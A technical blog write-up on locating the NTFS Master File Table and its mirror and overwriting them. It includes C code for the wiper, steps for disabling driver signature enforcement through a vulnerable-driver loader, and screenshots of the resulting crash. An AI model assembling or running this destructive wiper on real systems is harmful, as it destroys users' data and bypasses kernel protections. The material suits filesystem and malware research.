---
title: "Wiping the MFT from NTFS and Making Windows Unbootable"
description: "A technical walkthrough of locating and wiping the NTFS Master File Table (MFT) and MFT mirror."
pubDate: 2025-09-11
canonicalSlug: "2025/09-11-wipemft"
readingTime: "12-18 minute read"
---

### Disclaimer

This is an experimental writeup about Windows internals and filesystem corruption. The experiment was conducted to understand how NTFS stores metadata and how Windows reacts when that metadata is damaged.

Do not reproduce it on a system containing data you care about. Filesystem corruption can make an entire volume inaccessible, and a virtual machine isn't automatically safe if it has access to physical disks or other host resources.

I'm documenting what I investigated, what I observed, and what I still don't fully understand. Those last two things aren't always the same.

*I, wqsv, am not at fault for anything you do with this article. You are 100% to blame if something occurs.*

### 0. Introduction

NTFS is pretty good at hiding its complexity from us. We create files, rename directories, and delete things without having to think about where the filesystem stores the information needed to make all of that work.

Underneath that familiar interface, however, NTFS maintains a collection of metadata structures that keep track of files, directories, allocated space, and other filesystem information. One of the most important of these is the **Master File Table**, or **MFT**.

The MFT is essentially NTFS's main index of files and directories. It contains at least one file record for every file and directory on a volume, including the MFT itself. These records hold information such as file attributes, timestamps, permissions, and references to file data. Depending on the file, some of its data can even be stored directly inside its MFT record.

That last detail is worth keeping in mind: the MFT isn't a container holding every file's contents. It's a metadata structure that also describes where file data is stored when that data lives elsewhere on the volume.

If the MFT becomes corrupted, NTFS can lose the information it needs to locate and interpret files. The data itself might still exist on the disk, but knowing that it's there and recovering it are two different problems.

NTFS also maintains a structure called $MFTMirr, commonly known as the **MFT mirror**. Despite the name, it isn't a complete backup of the MFT. It mirrors a limited number of important file record segments, conventionally the first four or one cluster if the cluster is larger than 4 KiB.

The mirror can help preserve critical metadata, but it doesn't make the MFT disposable. Losing both structures can leave the filesystem severely damaged, and the mirror's existence doesn't guarantee recovery.

This is one reason ransomware that targets filesystem metadata can be very destructive. The original Petya ransomware family, for example, attacked boot-related disk structures and encrypted critical NTFS metadata, including the MFT. Repairing the master boot record (MBR) alone doesn't reverse that encryption.

For this experiment, I wanted to explore how Windows exposes information about the MFT, how its location can be inspected, and what happens when critical filesystem metadata is damaged.

### 1. Locating MFT and retrieving its size via IOCTLs

Before looking at any Windows APIs, let's establish a few concepts. Otherwise, the code might appear to give us a simple address and a size, when the underlying filesystem is considerably more complicated.

#### 1.1 File records and attributes
The MFT is made up of file record segments. Each record describes a file or directory through a collection of attributes.

For example, a file record might contain its filename, timestamps, security information, and information about its data stream. A file's data can be represented by a resident attribute, stored directly in the record, or by a nonresident attribute that describes data stored elsewhere on the volume.

For nonresident data, NTFS uses allocation information to describe where the data lives. This matters because a file doesn't have to occupy one uninterrupted stretch of disk space.

The same principle applies to the MFT itself. Although NTFS tries to keep the MFT reasonably contiguous as it grows, fragmentation is possible.

#### 1.2 Clusters, sectors, and offsets
These terms are easy to mix up, so let's distinguish them.

A sector is an addressable unit of storage at the device or volume interface. A cluster is an NTFS allocation unit, usually consisting of multiple sectors.

For example, suppose a volume reports these values:

<div class="table-scroll">
<table border="1" cellpadding="6" cellspacing="0">
<thead>
<tr><th>Property</th><th>Example value</th>
</thead>
<tbody>
<tr><td>Bytes per sector</td><td>512</td>
<tr><td>Bytes per cluster</td><td>4,096</td>
<tr><td>Sectors per cluster</td><td>8</td>
</tbody>
</table>
</div>

A cluster in this example occupies eight 512-byte sectors. Sectors are usually 512 bytes long but they can be larger (see [Advanced Format](https://en.wikipedia.org/wiki/Advanced_Format)).

NTFS identifies clusters using **Logical Cluster Numbers**, or LCNs. An LCN is a cluster index relative to the beginning of the volume, not an absolute physical-disk address.

If a volume has 4,096 bytes per cluster and the MFT begins at LCN 786,432, its starting byte offset within the volume is:
```text
786,432 × 4,096 = 3,221,225,472 bytes
```
With 512-byte sectors, that corresponds to a volume-relative sector index of 6,291,456. These calculations tell us where the MFT begins. They do not tell us that the entire MFT occupies one continuous range of sectors. That's an important distinction, and it becomes relevant when interpreting the information returned by Windows.

#### 1.3 The MFT's logical length isn't its physical layout
Windows exposes the MFT's starting LCN and its valid data length through an API we'll use later.

It's tempting to take the starting location, divide the reported length by the sector size, and conclude that we've identified every sector occupied by the MFT. That conclusion doesn't follow.

The valid data length describes the length of the MFT's data in bytes. It isn't a list of physical extents.

The MFT doesn't have to occupy one continuous area of the volume. If it becomes fragmented, parts of it may be stored in different locations. This means that knowing where the MFT starts and how much valid data it contains isn't enough to determine every cluster it occupies. To find its complete layout, we'd need to examine the MFT's allocation metadata, which describes where its data is stored.

To determine the actual allocation layout, we'd need to examine the MFT's own metadata and interpret its nonresident data attributes, including the runlist that describes its allocated clusters.

The API we'll use is good for locating the beginning of the MFT and inspecting volume information. It doesn't replace that deeper analysis.

### 2. Asking Windows where the MFT begins
NTFS already knows where its metadata lives, so there's no need to guess from a hex dump.

Windows exposes this information through `DeviceIoControl()` and the `FSCTL_GET_NTFS_VOLUME_DATA` control code. When the request succeeds, the output includes an `NTFS_VOLUME_DATA_BUFFER` structure containing information about the volume.

Some of the fields are particularly relevant to this experiment:

<div class="table-scroll">
<table border="1" cellpadding="6" cellspacing="0">
<thead>
<tr><th>Member</th><th>What it tells us</th>
</thead>
<tbody>
<tr><td>BytesPerSector</td><td>Number of bytes per sector on the volume</td>
<tr><td>BytesPerCluster</td><td>Number of bytes per cluster</td>
<tr><td>BytesPerFileRecordSegment</td><td>Size of an MFT file record segment</td>
<tr><td>MftStartLcn</td><td>Starting LCN of the MFT</td>
<tr><td>Mft2StartLcn</td><td>Starting LCN of the MFT mirror</td>
<tr><td>MftValidDataLength</td><td>Valid data length of the MFT, in bytes</td>
</tbody>
</table>
</div>

The structure also provides other information, such as the total number of clusters and the MFT zone boundaries. Microsoft documents the structure [here](https://learn.microsoft.com/en-us/windows/win32/api/winioctl/ns-winioctl-ntfs_volume_data_buffer).

The useful part is that Windows returns filesystem metadata directly. We don't have to parse the NTFS boot sector just to obtain these particular values.

#### 2.1 Finding NTFS volumes
The first step is to identify volumes we can inspect.

`GetLogicalDrives()` returns a bitmask representing the drive letters currently assigned in Windows. Bit zero corresponds to `A:`, bit one to `B:`, bit two to `C:`, and so on.

For example, if the bit corresponding to C: is set, that drive letter is currently assigned. We can use a loop to enumerate the available letters. From there, `GetDriveTypeA()` can tell us whether a root path refers to a local disk, removable drive, network drive, or another supported type. `GetVolumeInformationA()` provides the filesystem name, allowing us to filter for NTFS. For example,

```c
for (char letter = 'A'; letter <= 'Z'; ++letter) {
    if (!(drives & (1u << (letter - 'A')))) continue;
}
```

There is one limitation here though: enumerating drive letters doesn't enumerate every volume on the system. An NTFS volume without an assigned drive letter won't appear in this scan. For this small experiment, that's okay.

#### 2.2 Opening the volume
Once we've found an NTFS volume, we can open its volume device path using `CreateFile()`.
For example, the volume path for C: is represented as `\\.\C:`.

The handle can then be passed to `DeviceIoControl()` with `FSCTL_GET_NTFS_VOLUME_DATA`. If the request succeeds, the output buffer contains the `NTFS_VOLUME_DATA_BUFFER` structure.

Opening a volume and querying its metadata are different from opening the underlying physical disk. Keeping that distinction clear will matter when discussing sector addresses later.

The program needs administrator permissions, and the volume must be accessible for the requested operation. 

### 3. Interpreting the returned values
Once the API returns the volume information, we can inspect the MFT-related fields. Consider this example code:
```c
DWORD drives = GetLogicalDrives();
if (drives == 0) {
  printf("GetLogicalDrives failed");
  return 1;
}

printf("Scanning logical drives A:..Z: for NTFS volumes\n\n");

for (char letter = 'A'; letter <= 'Z'; ++letter) {
  if (!(drives & (1u << (letter - 'A')))) continue;

  char rootPath[8] = { 0 };
  snprintf(rootPath, sizeof(rootPath), "%c:\\", letter);

  UINT driveType = GetDriveTypeA(rootPath);
  if (driveType == DRIVE_NO_ROOT_DIR || driveType == DRIVE_UNKNOWN) continue;

  char fsName[MAX_PATH + 1] = { 0 };
  if (!GetVolumeInformationA(rootPath, NULL, 0, NULL, NULL, NULL, fsName, sizeof(fsName)))
    continue; // skip if cannot get info

  if (_stricmp(fsName, "NTFS") != 0)
    continue; // skip if not NTFS

  char volDevicePath[16];
  snprintf(volDevicePath, sizeof(volDevicePath), "\\\\.\\%c:", letter);

  printf("Volume %c: (path %s) -> NTFS\n", letter, volDevicePath);
  HANDLE hVolume = CreateFileA(volDevicePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
  if (hVolume == INVALID_HANDLE_VALUE) {
    printf("CreateFile for volume failed\n");
    continue;
  }

  NTFS_VOLUME_DATA_BUFFER nvdb = {0};
  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hVolume, FSCTL_GET_NTFS_VOLUME_DATA, NULL, 0, &nvdb, sizeof(nvdb), &bytesReturned, NULL)) {
    printf("FSCTL_GET_NTFS_VOLUME_DATA failed\n");
    CloseHandle(hVolume);
    continue;
  }

  STORAGE_DEVICE_NUMBER sdn = { 0 };
  BOOL sdnOk = DeviceIoControl(hVolume, IOCTL_STORAGE_GET_DEVICE_NUMBER, NULL, 0, &sdn, sizeof(STORAGE_DEVICE_NUMBER), &bytesReturned, NULL);
  if (!sdnOk || sdn.DeviceType != FILE_DEVICE_DISK) {
    printf("Failed to get storage device number\n");
    CloseHandle(hVolume);
    continue;
  }

  LONGLONG mftVolumeByte = nvdb.MftStartLcn.QuadPart * nvdb.BytesPerCluster;
  LONGLONG mftVolumeRelativeSector = mftVolumeByte / nvdb.BytesPerSector;
  LONGLONG mftSizeInSectors = nvdb.MftValidDataLength.QuadPart / nvdb.BytesPerSector;
  LONGLONG mftMirrorVolumeByte = nvdb.Mft2StartLcn.QuadPart * nvdb.BytesPerCluster;
  LONGLONG mftMirrorVolumeRelativeSector = mftMirrorVolumeByte / nvdb.BytesPerSector;
  DWORD mftMirrorSizeConventional = (nvdb.BytesPerCluster > 4096) ? nvdb.BytesPerCluster : nvdb.BytesPerFileRecordSegment * 4;
  DWORD mftMirrorSizeInSectors = mftMirrorSizeConventional / nvdb.BytesPerSector;

  printf("  BytesPerSector: %lu, BytesPerCluster: %lu\n", nvdb.BytesPerSector, nvdb.BytesPerCluster);
  printf("  BytesPerFileRecordSegment: %lu\n", nvdb.BytesPerFileRecordSegment);
  printf("  MFT LCN: %lld  -> volume byte offset: %lld\n", nvdb.MftStartLcn.QuadPart, mftVolumeByte);
  printf("  MFT volume-relative sector: %lld sector\n", mftVolumeRelativeSector);
  printf("  MftValidDataLength: %lld bytes\n", nvdb.MftValidDataLength.QuadPart);
  printf("  MFT size in number of sectors: %lld sectors\n", mftSizeInSectors);
  printf("  MFTMirr LCN: %lld -> volume byte offset: %lld\n", nvdb.Mft2StartLcn.QuadPart, mftMirrorVolumeByte);
  printf("  MFTMirr volume-relative sector: %lld sector\n", mftMirrorVolumeRelativeSector);
  printf("  MFTMirr conventional size: %lu bytes (4 * fileRecordSize)\n", mftMirrorSizeConventional);
  printf("  MFTMirr conventional size in sectors: %lu sectors\n", mftMirrorSizeInSectors);

  CloseHandle(hVolume);
  printf("\n");
}
```

Running the above code, we get the following output:

```text
Scanning logical drives A:..Z: for NTFS volumes

Volume C: (path \\.\C:) -> NTFS
  BytesPerSector: 512, BytesPerCluster: 4096
  BytesPerFileRecordSegment: 1024
  MFT LCN: 786432  -> volume byte offset: 3221225472
  MFT volume-relative sector: 6291456 sector
  MftValidDataLength: 1550581760 bytes
  MFT size in number of sectors: 3028480 sectors
  MFTMirr LCN: 2 -> volume byte offset: 8192
  MFTMirr volume-relative sector: 16 sector
  MFTMirr conventional size: 4096 bytes (4 * fileRecordSize)
  MFTMirr conventional size in sectors: 8 sectors

Volume D: (path \\.\D:) -> NTFS
  BytesPerSector: 512, BytesPerCluster: 4096
  BytesPerFileRecordSegment: 1024
  MFT LCN: 786432  -> volume byte offset: 3221225472
  MFT volume-relative sector: 6291456 sector
  MftValidDataLength: 363331584 bytes
  MFT size in number of sectors: 709632 sectors
  MFTMirr LCN: 2 -> volume byte offset: 8192
  MFTMirr volume-relative sector: 16 sector
  MFTMirr conventional size: 4096 bytes (4 * fileRecordSize)
  MFTMirr conventional size in sectors: 8 sectors

Volume E: (path \\.\E:) -> NTFS
  BytesPerSector: 512, BytesPerCluster: 4096
  BytesPerFileRecordSegment: 1024
  MFT LCN: 786432  -> volume byte offset: 3221225472
  MFT volume-relative sector: 6291456 sector
  MftValidDataLength: 2883584 bytes
  MFT size in number of sectors: 5632 sectors
  MFTMirr LCN: 2 -> volume byte offset: 8192
  MFTMirr volume-relative sector: 16 sector
  MFTMirr conventional size: 4096 bytes (4 * fileRecordSize)
  MFTMirr conventional size in sectors: 8 sectors
```

Taking a snippet from the C: output:
```text
BytesPerSector: 512
BytesPerCluster: 4096
BytesPerFileRecordSegment: 1024
MFT LCN: 786432
MftValidDataLength: 1550581760 bytes
MFTMirr LCN: 2
```
The MFT begins at volume-relative LCN 786,432. Multiplying that value by the cluster size gives the starting byte offset within the volume. The mirror's reported starting LCN can be converted in the same way.

The file record segment size tells us how large an individual MFT record segment is. In this example, each record is 1,024 bytes.

It's also possible to calculate how many bytes of valid MFT data are represented by a given number of file records. However, that arithmetic still doesn't reveal the MFT's complete physical allocation.

One other subtlety: BytesPerSector describes the sector size reported for the volume. It should not automatically be treated as the physical disk's hardware sector size. Devices and storage stacks can expose different logical and physical sector characteristics.

The MFT mirror conventionally stores the first four MFT file record segments (or one cluster if the cluster is larger than 4 KiB, as mentioned earlier). If each record is 1,024 bytes, four records would occupy 4,096 bytes. However, this calculation only gives us the expected size. It doesn't confirm the mirror's actual allocation on a particular volume. To verify that, we'd need to examine the relevant NTFS metadata rather than rely on the starting LCN and the calculated size alone.

### 4. Looking at the structures in a hex editor
With the reported locations in hand, I opened the relevant regions in HxD to examine the bytes directly.

<img alt="Hex editor showing MFT" src="/writeup-assets/2025/wipemft/mft-hxd.png"/>

<img alt="Hex editor showing MFT mirror" src="/writeup-assets/2025/wipemft/mftmirr-hxd.png"/>

Looking at raw bytes helps because it lets us compare the data on disk with the metadata reported by Windows. It can also help us recognize file record headers and other NTFS structures.

However, a hex editor only shows bytes at the offset we give it. It doesn't know whether the offset corresponds to the correct filesystem object, whether the structure is complete, or whether we've interpreted the data correctly.

The regions I inspected appeared consistent with the locations I was examining. That told me I was probably looking in the right place, but it wasn't proof that I had identified the MFT's entire allocation.

At this point, the distinction between locating a structure and understanding its complete layout becomes important. 


Should we wipe those MFT sectors? Yes! Why not? That's exactly what we're going to do. A rigorous approach would parse the MFT's own metadata and follow its runlist so that every allocated extent gets wiped. That's a lot of work! This is just a PoC so I'm going to take the simpler route: overwrite the contiguous span starting at `MftStartLcn` for `MftValidDataLength` bytes and see what happens. It won’t necessarily cover the whole MFT, and it may clobber unrelated data that happens to sit inside that range. For this experiment, that's acceptable.

We will use a kernel driver that lets us arbitrarily read and write sectors. It's available at https://github.com/wqsv/SectorIO, which I wrote.

### 5. How does SectorIO work?
We won't dive too deeply into the internals, but the basic idea is fairly straightforward.

SectorIO maintains a list of storage devices on the system and provides a way to read from or write to individual sectors on those devices. To build this list, it queries Windows for the available disk, partition, volume, and CD-ROM interfaces.

It uses `IoGetDeviceInterfaces()` to retrieve the symbolic links associated with these interfaces, then resolves them into device objects using `IoGetDeviceObjectPointer()`. Once it has a reference to a device, it gathers relevant information, such as disk size, partition layout, and sector geometry, using standard I/O control codes (IOCTLs). These include `IOCTL_STORAGE_GET_DEVICE_NUMBER`, `IOCTL_DISK_GET_PARTITION_INFO_EX`, and `IOCTL_DISK_GET_DRIVE_GEOMETRY_EX`.

Think of IOCTLs as requests sent to Windows or a device driver to retrieve information or perform a specific operation. SectorIO stores the information it collects in a list of storage objects, which it can reference when handling subsequent I/O requests.

When a read or write operation is requested, the driver constructs an I/O Request Packet (IRP) describing the operation and sends it down the device stack, which is a chain of drivers through which the request travels before reaching the underlying device. Once the operation completes, a completion routine handles the result, allowing the driver to report the outcome to its caller.

### 6. The MFT Wiping Part
Now for the part you've probably been waiting for: how do we actually wipe or modify the Master File Table (MFT)?

At a high level, the process is straightforward: load the driver, send it a write IOCTL, and have it write a junk pattern to the target sectors. Of course, there are a few complications along the way.

On modern versions of Windows, loading a kernel-mode driver isn't as simple as compiling it and installing it. Windows enforces **Driver Signature Enforcement (DSE)**, a security mechanism that verifies whether kernel-mode drivers meet the applicable code-signing requirements before allowing them to load. This helps prevent unsigned or improperly signed code from executing in the kernel, where it would have extensive access to the system.

For development and testing, Windows also has a test-signing mode. Enabling it requires changing the relevant Boot Configuration Data (BCD) settings and restarting the system. Windows then operates in test-signing mode, which displays a desktop watermark. That's not convenient if you want to avoid modifying the system's boot configuration.

Another, more notorious approach involves exploiting a vulnerable but legitimately signed driver to circumvent these restrictions. The idea is to take advantage of a flaw in a driver that Windows already trusts, using its privileged access to interfere with kernel security mechanisms. Depending on the vulnerability, this can include arbitrary kernel memory read and write capabilities, which can be abused to tamper with the state used by DSE to enforce driver-signing requirements. 

FOSS tools like [Kernel Driver Utility (KDU)](https://github.com/hfiref0x/KDU) automate parts of this process by leveraging known vulnerable drivers to facilitate the loading of unsigned kernel-mode code. This technique is commonly associated with bring-your-own-vulnerable-driver (BYOVD) attacks. KDU is really handy for kernel research and testing.

We have compiled both KDU and SectorIO from their respective source code repositories. With both binaries ready, we can use KDU to modify the system's Driver Signature Enforcement (DSE) state, as shown below.

<img alt="KDU setting DSE value to zero" src="/writeup-assets/2025/wipemft/kdu-setting-dse-value-to-0.png"/>

We selected provider 54, although the appropriate provider depends on the vulnerable driver being used and the target system. In KDU, a *provider* identifies the mechanism used to load and execute code through a vulnerable driver.

As shown in the output, KDU reports that the original DSE value was 6 and that it has been changed to 0. This output reflects the specific technique used by KDU; the underlying implementation is more complex than simply toggling a universal on/off switch.

**Restoring the original state is just as important as disabling it!** Windows includes Kernel Patch Protection (PatchGuard), which periodically checks critical kernel structures and detects certain unauthorized modifications. Leaving kernel security structures in an unexpected state can cause a system bug check (BSOD), potentially with a stop code such as `CRITICAL_STRUCTURE_CORRUPTION`.

Once the driver has been loaded, the system should be returned to its original security state. The following screenshot shows the next stage, where we create the SectorIO service.

<img alt="Creating SectorIO service using sc create command and restoring DSE value" src="/writeup-assets/2025/wipemft/starting-driver-and-restoring-dse-value.png"/>

Let's write some code to wipe the MFT and its mirror. We'll use a function called WipeSectors, which takes a device handle, some device-identification information, the starting sector, the sector size, and the number of sectors to process.

```c
void WipeSectors(HANDLE hDevice, BOOLEAN isRawDiskObject, ULONG diskIndex, ULONG partitionNumber, ULONGLONG sectorNumber, ULONG sectorSize, ULONG nSectors) {
  size_t total = (size_t)nSectors * sectorSize;
  UCHAR* writeBuffer = (UCHAR*)malloc(total);
  if (!writeBuffer) {
    printf("Error: Out of memory for wipe buffer\n");
    return;
  }

  STORAGE_LOCATION writeLoc = { 0 };
  writeLoc.isRawDiskObject = isRawDiskObject;
  writeLoc.diskIndex = diskIndex;
  writeLoc.partitionNumber = partitionNumber;
  writeLoc.sectorNumber = sectorNumber;

  for (size_t i = 0; i < total; i++) {
    switch (i & 3) {
      case 0: writeBuffer[i] = 0xAB; break;
      case 1: writeBuffer[i] = 0xCD; break;
      case 2: writeBuffer[i] = 0xEF; break;
      default: writeBuffer[i] = 0x01; break;
    }
  }

  DWORD bytesReturned = 0;
  BOOL ok = DeviceIoControl(hDevice, IOCTL_SECTOR_WRITE, &writeLoc, sizeof(writeLoc), writeBuffer, (DWORD)total, &bytesReturned, NULL);
  if (!ok) {
    printf("IOCTL_SECTOR_WRITE failed\n");
    free(writeBuffer);
    return;
  }

  printf("Wiped %lu sectors (from %llu to %llu) with pattern.\n", nSectors, sectorNumber, (unsigned long long)(sectorNumber + nSectors - 1));
  free(writeBuffer);
}
```

You can refer to [example.cpp in the SectorIO repo](https://github.com/wqsv/SectorIO/blob/master/example.cpp) for an example of how the driver interface is used.

With the function in place, we can pass it the sector locations and sizes associated with the MFT and its mirror:
```c
printf("Wiping MFT starting at sector %lld (%lld sectors)...\n", mftVolumeRelativeSector, mftSizeInSectors);
WipeSectors(hDevice, FALSE, sdn.DeviceNumber, sdn.PartitionNumber, mftVolumeRelativeSector, nvdb.BytesPerSector, (ULONG)mftSizeInSectors);

printf("Wiping MFT Mirror starting at sector %lld (%lu sectors)...\n", mftMirrorVolumeRelativeSector, mftMirrorSizeInSectors);
WipeSectors(hDevice, FALSE, sdn.DeviceNumber, sdn.PartitionNumber, mftMirrorVolumeRelativeSector, nvdb.BytesPerSector, mftMirrorSizeInSectors);
```

Before sending any IOCTLs, we first need to open a handle to the SectorIO device:
```c
HANDLE hDevice = CreateFileA("\\\\.\\SectorIO", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
if (hDevice == INVALID_HANDLE_VALUE) {
  printf("Cannot open \\\\.\\SectorIO\n");
  return 1;
}
printf("Opened \\\\.\\SectorIO successfully.\n\n");
```
This gives us a handle to the driver's device interface, which we can use to submit requests. If opening the device fails, the program exits rather than attempting to continue without a valid handle.

#### 6.1. Running the Wiper
With everything in place, we can compile the program and run it to see what happens.

<img alt="Running our MFT wiper" src="/writeup-assets/2025/wipemft/running-our-wiper-program.png"/>

The program appears to complete the operation. But did it actually overwrite the intended sectors? Let's inspect the disk contents in a hex editor.

<img alt="Wiped MFT in HxD" src="/writeup-assets/2025/wipemft/wiped-mft-in-hxd.png"/>


<img alt="Wiped MFT Mirror in HxD" src="/writeup-assets/2025/wipemft/wiped-mft-mirr-in-hxd.png"/>

The inspected regions appear to have been overwritten. However, writing directly to filesystem metadata has consequences beyond the contents of those sectors.

Shortly after the operation, Windows starts reporting errors:

<img alt="Some errors we get after wiping MFT" src="/writeup-assets/2025/wipemft/errors-we-get-after-wiping-mft-1.png"/>

<img alt="Some errors we get after wiping MFT" src="/writeup-assets/2025/wipemft/errors-we-get-after-wiping-mft-2.png"/>

Eventually, the system also crashes with a lovely and sweet bug check:

<img alt="Bugcheck after wiping MFT" src="/writeup-assets/2025/wipemft/bugcheck-after-wiping-mft.png"/>

These results aren't entirely surprising. The MFT contains critical NTFS metadata, including records used to describe files and directories. The MFT mirror stores copies of a limited subset of those records; it isn't a complete backup of the MFT. Overwriting these structures can leave NTFS unable to interpret the volume correctly, resulting in filesystem errors and potentially a system crash.

### 7. Can there be other ways?

Sure there can be. One alternative is to parse the NTFS BIOS Parameter Block (BPB) in the volume's boot sector to obtain filesystem geometry and locate the MFT and its mirror. NTFS boot-sector metadata includes information that can help determine their starting locations, although determining their full extents requires additional interpretation of the filesystem metadata. This can get complicated pretty quickly, and honestly, it feels unnecessary when Windows already provides APIs to retrieve much of this information for us.

Another possibility is to implement the operation outside the running Windows environment, such as in a custom bootloader. For example, a bootloader could wipe the MFT while relying on a user-mode application that previously wrote the MFT offset and size to a known sector. A custom bootloader also introduces its own compatibility and reliability challenges.

### 8. Conclusion

This was more of a proof-of-concept. And no, the full source code will not be available. If you *really* want to do this, you should be able to recreate the source code from fragments.

Thanks for reading!
